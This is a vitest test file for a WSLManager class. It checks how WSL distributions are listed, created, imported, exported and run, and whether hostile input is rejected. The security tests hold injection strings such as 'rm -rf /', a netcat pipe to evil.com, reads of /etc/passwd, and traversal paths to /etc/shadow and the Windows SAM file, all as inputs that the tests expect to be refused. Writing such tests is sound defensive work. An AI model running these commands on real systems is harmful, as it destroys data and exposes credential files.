/**
 * WSLManager Real Tests
 * Tests actual WSL operations without mocks
 *
 * @author Marcus Johnson, QA Manager
 *
 * IMPORTANT: These tests execute real WSL commands
 * Ensure WSL is installed and accessible
 */

import { describe, it, expect, beforeAll, afterEach } from 'vitest';
import { WSLManager } from '../../src/wslManager';
import { testEnv, cleanupTestDistributions } from '../helpers/wslTestEnvironment';
import { testDataBuilder, cleanupTestData } from '../helpers/testDataBuilder';
import {
    assertDistributionExists,
    assertCommandSucceeds,
    assertFileCreated,
    assertValidTarFile,
    assertThrowsAsync,
    assertPerformance,
    assertWSLOutput
} from '../helpers/assertions';
import * as path from 'path';
import * as fs from 'fs';

describe('WSLManager - Real System Tests', () => {
    let wslManager: WSLManager;

    beforeAll(() => {
        wslManager = new WSLManager();
    });

    afterEach(async () => {
        // Clean up any test distributions created
        await cleanupTestDistributions();
        cleanupTestData();
    });

    describe('listDistributions()', () => {
        it('should list real WSL distributions on the system', async () => {
            // This test uses the actual WSL installation
            const distributions = await wslManager.listDistributions();

            // Verify we get an array
            expect(Array.isArray(distributions)).toBe(true);

            // If there are distributions, verify their structure
            if (distributions.length > 0) {
                const distro = distributions[0];
                expect(distro).toHaveProperty('name');
                expect(distro).toHaveProperty('state');
                expect(distro).toHaveProperty('version');
                expect(distro).toHaveProperty('default');

                // Verify state is valid
                expect(['Running', 'Stopped']).toContain(distro.state);

                // Verify version is valid
                expect(['1', '2']).toContain(distro.version);
            }
        });

        it('should execute within performance limits', async () => {
            // List operation should complete within 5 seconds
            await assertPerformance(
                () => wslManager.listDistributions(),
                5000,
                'List distributions'
            );
        });

        it('should handle WSL not installed gracefully', async () => {
            // This test checks error handling
            // We'll simulate by checking if the error is handled properly
            // In a real environment without WSL, this would throw
            try {
                const distributions = await wslManager.listDistributions();
                // If WSL is installed, this is ok
                expect(Array.isArray(distributions)).toBe(true);
            } catch (error: any) {
                // If WSL is not installed, we should get a specific error
                expect(error.message).toContain('WSL is not installed');
            }
        });
    });

    describe('createDistribution()', () => {
        it('should validate distribution name', async () => {
            // Test invalid names
            const invalidNames = [
                'test; rm -rf /',  // Command injection
                '../test',          // Path traversal
                'test\0null',       // Null byte
                '',                 // Empty
                'a'.repeat(256)     // Too long
            ];

            for (const name of invalidNames) {
                await assertThrowsAsync(
                    () => wslManager.createDistribution(name, 'Ubuntu'),
                    /invalid|validation|failed/i
                );
            }
        });

        it('should require base distribution to exist', async () => {
            // Try to create from non-existent base
            await assertThrowsAsync(
                () => wslManager.createDistribution('test-dist', 'NonExistentDistro'),
                /not found|does not exist/i
            );
        });

        it.skip('should create distribution from existing base', async function() {
            // Skip if no distributions available
            const distros = await wslManager.listDistributions();
            if (distros.length === 0) {
                this.skip();
                return;
            }

            const baseName = distros[0].name;
            const testName = `test-clone-${Date.now()}`;

            try {
                // Create distribution
                await wslManager.createDistribution(testName, baseName);

                // Verify it exists
                await assertDistributionExists(testName);

                // Clean up
                await wslManager.unregisterDistribution(testName);
            } catch (error) {
                // Clean up on error
                try {
                    await wslManager.unregisterDistribution(testName);
                } catch {}
                throw error;
            }
        });
    });

    describe('importDistribution()', () => {
        it('should validate TAR file path', async () => {
            await assertThrowsAsync(
                () => wslManager.importDistribution('test', '/nonexistent/file.tar'),
                /not found|does not exist/i
            );
        });

        it('should validate distribution name on import', async () => {
            const tarPath = testDataBuilder.createRealTarFile('test-import', 10);

            await assertThrowsAsync(
                () => wslManager.importDistribution('test;evil', tarPath),
                /invalid|validation/i
            );
        });

        it.skip('should import valid TAR file', async function() {
            // This test requires a valid TAR file
            // Skip if not available
            const tarPath = path.join(__dirname, '../fixtures/distributions/minimal-alpine.tar');
            if (!fs.existsSync(tarPath)) {
                this.skip();
                return;
            }

            const testName = `test-import-${Date.now()}`;

            try {
                // Import distribution
                await wslManager.importDistribution(testName, tarPath);

                // Verify it exists
                await assertDistributionExists(testName);

                // Clean up
                await wslManager.unregisterDistribution(testName);
            } catch (error) {
                // Clean up on error
                try {
                    await wslManager.unregisterDistribution(testName);
                } catch {}
                throw error;
            }
        });
    });

    describe('exportDistribution()', () => {
        it('should validate export path', async () => {
            await assertThrowsAsync(
                () => wslManager.exportDistribution('Ubuntu', '/invalid\0path/export.tar'),
                /invalid|validation/i
            );
        });

        it.skip('should export existing distribution', async function() {
            // Skip if no distributions available
            const distros = await wslManager.listDistributions();
            if (distros.length === 0) {
                this.skip();
                return;
            }

            const distroName = distros[0].name;
            const exportPath = path.join(
                process.env.TEMP || '/tmp',
                `export-test-${Date.now()}.tar`
            );

            try {
                // Export distribution
                await wslManager.exportDistribution(distroName, exportPath);

                // Verify TAR file created
                await assertFileCreated(exportPath);
                assertValidTarFile(exportPath);

                // Clean up
                fs.unlinkSync(exportPath);
            } catch (error) {
                // Clean up on error
                if (fs.existsSync(exportPath)) {
                    fs.unlinkSync(exportPath);
                }
                throw error;
            }
        });

        it('should handle non-existent distribution', async () => {
            const exportPath = path.join(process.env.TEMP || '/tmp', 'test.tar');

            await assertThrowsAsync(
                () => wslManager.exportDistribution('NonExistentDistro', exportPath),
                /not found|does not exist/i
            );
        });
    });

    describe('unregisterDistribution()', () => {
        it('should validate distribution name', async () => {
            await assertThrowsAsync(
                () => wslManager.unregisterDistribution('test;evil'),
                /invalid|validation/i
            );
        });

        it('should handle non-existent distribution gracefully', async () => {
            // Unregistering non-existent should not throw
            // or should throw a specific error
            try {
                await wslManager.unregisterDistribution('NonExistentDistro123');
                // If it succeeds, that's ok (idempotent)
            } catch (error: any) {
                // If it fails, should be clear error
                expect(error.message).toMatch(/not found|does not exist/i);
            }
        });
    });

    describe('terminateDistribution()', () => {
        it('should validate distribution name', async () => {
            await assertThrowsAsync(
                () => wslManager.terminateDistribution('test;evil'),
                /invalid|validation/i
            );
        });

        it.skip('should terminate running distribution', async function() {
            // Skip if no running distributions
            const distros = await wslManager.listDistributions();
            const running = distros.find(d => d.state === 'Running');

            if (!running) {
                this.skip();
                return;
            }

            // Terminate the distribution
            await wslManager.terminateDistribution(running.name);

            // Give it a moment to stop
            await new Promise(resolve => setTimeout(resolve, 1000));

            // Verify it's stopped
            const updated = await wslManager.listDistributions();
            const distro = updated.find(d => d.name === running.name);

            expect(distro?.state).toBe('Stopped');
        });
    });

    describe('setDefaultDistribution()', () => {
        it('should validate distribution name', async () => {
            await assertThrowsAsync(
                () => wslManager.setDefaultDistribution('test;evil'),
                /invalid|validation/i
            );
        });

        it('should require distribution to exist', async () => {
            await assertThrowsAsync(
                () => wslManager.setDefaultDistribution('NonExistentDistro'),
                /not found|does not exist/i
            );
        });

        it.skip('should set existing distribution as default', async function() {
            // Skip if no distributions available
            const distros = await wslManager.listDistributions();
            if (distros.length < 2) {
                this.skip();
                return;
            }

            // Find a non-default distribution
            const nonDefault = distros.find(d => !d.default);
            if (!nonDefault) {
                this.skip();
                return;
            }

            // Set as default
            await wslManager.setDefaultDistribution(nonDefault.name);

            // Verify it's now default
            const updated = await wslManager.listDistributions();
            const distro = updated.find(d => d.name === nonDefault.name);

            expect(distro?.default).toBe(true);
        });
    });

    describe('runCommand()', () => {
        it('should validate command input', async () => {
            const dangerousCommands = [
                '; rm -rf /',
                '&& malicious',
                '| nc evil.com 1234',
                '`cat /etc/passwd`'
            ];

            for (const cmd of dangerousCommands) {
                await assertThrowsAsync(
                    () => wslManager.runCommand('Ubuntu', cmd),
                    /invalid|validation|dangerous/i
                );
            }
        });

        it.skip('should execute command in distribution', async function() {
            // Skip if no distributions available
            const distros = await wslManager.listDistributions();
            if (distros.length === 0) {
                this.skip();
                return;
            }

            const distroName = distros[0].name;

            // Run a simple command
            const output = await wslManager.runCommand(distroName, 'echo "Hello from WSL"');

            // Verify output
            assertWSLOutput(output, 'Hello from WSL');
        });

        it('should handle command timeout', async () => {
            // This would test timeout handling
            // In real scenario, would need a distribution with a long-running command
        });
    });

    describe('getDistributionInfo()', () => {
        it.skip('should get distribution information', async function() {
            // Skip if no distributions available
            const distros = await wslManager.listDistributions();
            if (distros.length === 0) {
                this.skip();
                return;
            }

            const distroName = distros[0].name;

            // Get distribution info
            const info = await wslManager.getDistributionInfo(distroName);

            // Verify structure
            expect(info).toHaveProperty('name');
            expect(info.name).toBe(distroName);
        });

        it('should handle non-existent distribution', async () => {
            await assertThrowsAsync(
                () => wslManager.getDistributionInfo('NonExistentDistro'),
                /not found|does not exist/i
            );
        });
    });

    describe('Security Validation', () => {
        it('should prevent command injection in all methods', async () => {
            const maliciousInput = 'test; echo HACKED > /tmp/hacked.txt';

            // Test each method with malicious input
            const tests = [
                () => wslManager.createDistribution(maliciousInput, 'Ubuntu'),
                () => wslManager.importDistribution(maliciousInput, '/tmp/test.tar'),
                () => wslManager.unregisterDistribution(maliciousInput),
                () => wslManager.terminateDistribution(maliciousInput),
                () => wslManager.setDefaultDistribution(maliciousInput),
                () => wslManager.runCommand('Ubuntu', maliciousInput)
            ];

            for (const test of tests) {
                await assertThrowsAsync(test, /invalid|validation|dangerous/i);
            }

            // Verify no file was created (command didn't execute)
            expect(fs.existsSync('/tmp/hacked.txt')).toBe(false);
        });

        it('should prevent path traversal in file operations', async () => {
            const traversalPaths = [
                '../../../etc/passwd',
                '..\\..\\..\\Windows\\System32\\config\\sam',
                '/etc/shadow'
            ];

            for (const path of traversalPaths) {
                await assertThrowsAsync(
                    () => wslManager.importDistribution('test', path),
                    /invalid|validation|traversal/i
                );

                await assertThrowsAsync(
                    () => wslManager.exportDistribution('Ubuntu', path),
                    /invalid|validation|traversal/i
                );
            }
        });
    });
});